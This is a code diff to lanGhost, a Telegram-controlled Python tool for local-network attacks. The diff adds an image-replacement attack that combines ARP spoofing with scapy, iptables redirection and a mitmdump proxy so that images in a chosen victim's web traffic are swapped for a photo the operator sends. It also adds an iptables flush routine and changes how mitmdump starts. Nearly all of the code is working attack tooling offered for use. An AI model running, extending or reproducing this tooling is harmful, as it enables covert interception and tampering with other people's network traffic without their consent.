@@ -6,16 +6,19 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 
-from telegram.ext import Updater, CommandHandler
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 from netaddr import IPAddress
 from scapy.all import send, ARP
 from time import sleep
+import urllib.request
 import urllib.parse
 import netifaces
+import traceback
 import threading
 import telegram
 import requests
 import sqlite3
+import base64
 import time
 import nmap
 import json
@@ -57,6 +60,13 @@ def iptables(action, target=False):
         os.system("sudo iptables --delete-chain")
         os.system("sudo iptables --table nat --delete-chain")
         os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
+
+    if action == "flush":
+        print("[+] Flushing iptables...")
+        os.system("sudo iptables --flush")
+        os.system("sudo iptables --table nat --flush")
+        os.system("sudo iptables --delete-chain")
+        os.system("sudo iptables --table nat --delete-chain")
 
     if action == "kill":
         print("[+] Dropping connections from " + target + " with iptables...")
@@ -183,6 +193,21 @@ def arpSpoof(target, ID, atype):
                 iptables("stopkill", target=target[0])
             elif atype == "mitm":
                 iptables("stopmitm", target=target[0])
+            elif atype == "replaceimg":
+                iptables("stopmitm", target=target[0])
+
+                DBconn = sqlite3.connect(script_path + "lanGhost.db")
+                DBcursor = DBconn.cursor()
+                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+                DBconn.commit()
+                DBconn.close()
+
+                DBconn = sqlite3.connect(script_path + "lanGhost.db")
+                DBcursor = DBconn.cursor()
+                DBcursor.execute("DELETE FROM lanGhost_img WHERE attackid=?", [str(ID)])
+                DBconn.commit()
+                DBconn.close()
+
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
             break
 
@@ -190,14 +215,13 @@ def mitmHandler(target, ID, bot):
     global admin_chatid
     global script_path
 
-    print("[+][mitmHandler][ID:" + str(ID) + "] Starting mitmdump in screen session...")
-    os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -m -d mitmdump -T --host -s " + script_path + "proxy-script.py")
-
     while True:
         if attackManager("isrunning", ID=ID) == True:
             try:
                 DBconn = sqlite3.connect(script_path + "lanGhost.db")
                 DBcursor = DBconn.cursor()
+                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, time TEXT)")
+                DBconn.commit()
                 DBcursor.execute("SELECT * FROM lanGhost_mitm")
                 data = DBcursor.fetchall()
                 DBconn.close()
@@ -222,9 +246,6 @@ def mitmHandler(target, ID, bot):
             except:
                 print("[!!!] mitmHandler crashed...")
         else:
-            print("[+][mitmHandler][ID:" + str(ID) + "] Stopping mitmdump...")
-            os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -X stuff '^C\n'")
-            os.system("rm " + script_path + "lanGhost.db")
             break
 
 
@@ -415,6 +436,102 @@ def msg_mitm(bot, update, args):
     bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
     bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
     bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's from " + target_ip + "...")
+
+
+def msg_img(bot, update):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+    try:
+        global script_path
+        try:
+            DBconn = sqlite3.connect(script_path + "lanGhost.db")
+            DBcursor = DBconn.cursor()
+            DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+            DBconn.commit()
+            DBconn.close()
+        except:
+            return
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("SELECT * FROM lanGhost_img")
+        data = DBcursor.fetchall()
+        if not data == []:
+            for attack in data:
+                if attack[2] == "false":
+                    imgID = str(update.message.photo[-1].file_id)
+                    imgData = bot.getFile(imgID)
+                    request = urllib.request.urlopen(imgData["file_path"])
+                    img = request.read()
+                    img64 = base64.b64encode(img)
+
+                    target = json.loads(attack[1])
+                    ID = attackManager("new", attack_type="replaceimg", target=target[0])
+
+                    DBcursor.execute("UPDATE lanGhost_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
+                    DBconn.commit()
+
+
+
+                    iptables("mitm", target=target[0])
+                    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "replaceimg"])
+                    arp_thread.daemon = True
+                    arp_thread.start()
+
+                    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+                    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+                    bot.send_message(chat_id=update.message.chat_id, text="🔥 Replacing images for " + target[0] + "...")
+
+                    DBconn.close()
+                    break
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+
+def msg_replaceimg(bot, update, args):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+    try:
+        if args == []:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /replaceimg [IP]")
+            return
+
+        target_ip = args[0]
+
+        if attackManager("isattacked", target=target_ip):
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
+            return
+
+        global latest_scan
+        hosts = latest_scan[:]
+        target_mac = False
+        for host in hosts:
+            if host[0] == target_ip:
+                target_mac = host[1]
+        if not target_mac:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+            return
+
+        target = [target_ip, target_mac]
+        target = json.dumps(target)
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+        DBconn.commit()
+        DBconn.close()
+
+        DBconn = sqlite3.connect(script_path + "lanGhost.db")
+        DBcursor = DBconn.cursor()
+        DBcursor.execute("INSERT INTO lanGhost_img VALUES (?, ?, ?, ?)", ["false", target, "false", target_ip])
+        DBconn.commit()
+        DBconn.close()
+
+        bot.send_message(chat_id=update.message.chat_id, text="📷 Please send the image you want to replace others with:")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+
 def main():
     global admin_chatid
 
@@ -442,6 +559,10 @@ def main():
     dispatcher.add_handler(attacks_handler)
     mitm_handler = CommandHandler('mitm', msg_mitm, pass_args=True)
     dispatcher.add_handler(mitm_handler)
+    img_handler = MessageHandler(Filters.photo, msg_img)
+    dispatcher.add_handler(img_handler)
+    replaceimg_handler = CommandHandler('replaceimg', msg_replaceimg, pass_args=True)
+    dispatcher.add_handler(replaceimg_handler)
 
     print("[+] Telegram bot started...")
     while True:
@@ -449,6 +570,9 @@ def main():
             updater.start_polling()
         except KeyboardInterrupt:
             print("\n\n[+] Stopping...")
+            updater.stop()
+            os.system("sudo screen -S lanGhost-mitm -X stuff '^C\n'")
+            iptables("flush")
             attacks = attackManager("list")
             if not attacks == []:
                 print("[+] Stopping attacks...")
@@ -457,7 +581,7 @@ def main():
             if not attacks == []:
                 time.sleep(5)
             print("[+] lanGhost stopped")
-            exit()
+            raise SystemExit
         except:
             print("[!!!] Telegram bot crashed, restating...")
 
@@ -506,6 +630,9 @@ if __name__ == '__main__':
     except:
         print(header + """                         v1.0 """ + WHITE + """by @xdavidhu    """ + "\n" + END)
 
+    os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")
+    
+    os.system("sudo screen -S lanGhost-mitm -m -d mitmdump -T --host -s " + script_path + "proxy-script.py")
     refreshNetworkInfo()
     iptables("setup")
 
